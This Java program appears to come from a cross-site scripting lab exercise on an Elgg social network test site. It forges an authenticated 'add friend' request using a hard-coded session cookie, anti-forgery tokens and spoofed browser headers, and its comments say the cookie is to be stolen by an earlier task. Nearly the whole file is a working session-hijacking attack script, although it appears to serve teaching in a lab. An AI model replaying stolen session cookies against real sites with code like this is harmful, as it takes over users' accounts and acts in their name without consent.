import java.io.*;
import java.net.*;
public class HTTPForge {
	public static void main(String[] args) throws IOException {
	try {
		int responseCode;
		InputStream responseIn=null;
		String requestDetails = "&__elgg_ts=1460249405&__elgg_token=c27704a783c72e9d0caa1fc88d04ad15";
		// URL to be forged.
		URL url = new URL ("http://www.xsslabelgg.com/action/friends/add?friend=42"+requestDetails);
		// URLConnection instance is created to further parameterize a
		// resource request past what the state members of URL instance
		// can represent.
		HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();
		urlConn.setRequestMethod("GET");
		if (urlConn instanceof HttpURLConnection) {
		urlConn.setConnectTimeout(60000);
		urlConn.setReadTimeout(90000);
		}
// addRequestProperty method is used to add HTTP Header Information.
// Here we add User-Agent HTTP header to the forged HTTP packet.
// Add other necessary HTTP Headers yourself. Cookies should be stolen
// using the method in task3.
		urlConn.addRequestProperty("Host","www.xsslabelgg.com");
		urlConn.addRequestProperty("User-agent","Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:23.0) Gecko/20100101 Firefox/23.0");
		urlConn.addRequestProperty("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
		urlConn.addRequestProperty("Accept-Language","en-US,en;q=0.5");
		urlConn.addRequestProperty("Accept-Encoding","gzip, deflate");
		urlConn.addRequestProperty("Referer","http://www.xsslabelgg.com/profile/samy");
		urlConn.addRequestProperty("Cookie","Elgg=3ssipeul17vrpe0pfft7s4eif5");
		urlConn.addRequestProperty("Connection","keep-alive");
//HTTP Post Data which includes the information to be sent to the server.
//String data = "name=...&guid=..";
// DoOutput flag of URL Connection should be set to true
// to send HTTP POST message.
		urlConn.setDoOutput(true);
// OutputStreamWriter is used to write the HTTP POST data
// to the url connection.
		//OutputStreamWriter wr = new OutputStreamWriter(urlConn.getOutputStream());
		//wr.write(data);
		//wr.flush();
// HttpURLConnection a subclass of URLConnection is returned by
// url.openConnection() since the url is an http request.
		if (urlConn instanceof HttpURLConnection) {
			HttpURLConnection httpConn = (HttpURLConnection) urlConn;
		// Contacts the web server and gets the status code from
		// HTTP Response message.
			responseCode = httpConn.getResponseCode();
			System.out.println("Response Code = " + responseCode);
		// HTTP status code HTTP_OK means the response was
		// received sucessfully.
			if (responseCode == HttpURLConnection.HTTP_OK)
		// Get the input stream from url connection object.
			responseIn = urlConn.getInputStream();
		// Create an instance for BufferedReader
		// to read the response line by line.
			BufferedReader buf_inp = new BufferedReader(
			new InputStreamReader(responseIn));
			String inputLine;
			while((inputLine = buf_inp.readLine())!=null) {
				System.out.println(inputLine);
			}
		}
	} catch (MalformedURLException e) {
		e.printStackTrace();
	}
}
}
